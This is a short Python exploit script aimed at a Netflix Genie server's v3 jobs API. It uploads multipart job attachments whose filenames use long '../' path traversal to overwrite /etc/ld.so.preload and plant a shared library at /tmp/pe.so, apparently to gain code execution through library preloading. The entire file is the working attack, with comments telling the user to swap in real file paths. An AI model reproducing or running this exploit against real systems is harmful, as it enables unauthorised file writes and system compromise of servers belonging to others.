import socket
import requests
import json

HOST = 'localhost'
PORT = 8080
url = f"http://{HOST}:{PORT}/api/v3/jobs"


def send_chunked_request():

    headers = {
        'Accept': '*/*',
        'Host': 'localhost:1500',
        'Connection': 'Keep-Alive',
        'User-Agent': 'Apache-HttpClient/4.5.14 (Java/17.0.5)',
        'Accept-Encoding': 'gzip,deflate'
    }
    # 멀티파트 폼 데이터 구성
    files = {
        'request': (
            None,  # filename
            json.dumps({
                "id": None,
                "created": None,
                "updated": None,
                "version": "1.0",
                "user": "genie",
                "name": "List * ... Directories bash job",
                "description": "Genie 3 Test Job",
                "metadata": None,
                "tags": [],
                "configs": [],
                "dependencies": [],
                "setupFile": "file:/Users/joebeeton/workspace/it/genie/genie-web/build/resources/integTest/com/netflix/genie/web/apis/rest/v3/controllers/JobRestControllerIntegrationTests/job/jobsetupfile",
                "commandArgs": "-c 'sleep 5 && echo hello world'",
                "clusterCriterias": [{"tags": ["localhost"]}],
                "commandCriteria": ["bash"],
                "group": None,
                "disableLogArchival": True,
                "email": None,
                "cpu": None,
                "memory": None,
                "timeout": None,
                "applications": [],
                "grouping": None,
                "groupingInstance": None,
                "runtime": {
                    "resources": {
                        "cpu": None,
                        "gpu": None,
                        "memoryMb": None,
                        "diskMb": None,
                        "networkMbps": None
                    },
                    "images": {}
                }
            }),
            'application/json; charset=US-ASCII'
        ),
        'attachment': (
            '../../../../../../../../../../../../../../../../../../tmp/pe.so',
            open('/tmp/pe.so', 'rb'),  # 실제 파일 경로로 변경
            'application/octet-stream'
        ),
        'attachment2': (
            '../../../../../../../../../../../../../../../../../../etc/ld.so.preload',
            open('/etc/ld.so.preload', 'rb'),  # 실제 파일 경로로 변경
            'application/octet-stream'
        )
    }

    
    try:
        response = requests.post(url, files=files, headers=headers)
        print(f"Status Code: {response.status_code}")
        print(f"Response: {response.text}")
    except Exception as e:
        print(f"Error: {e}")
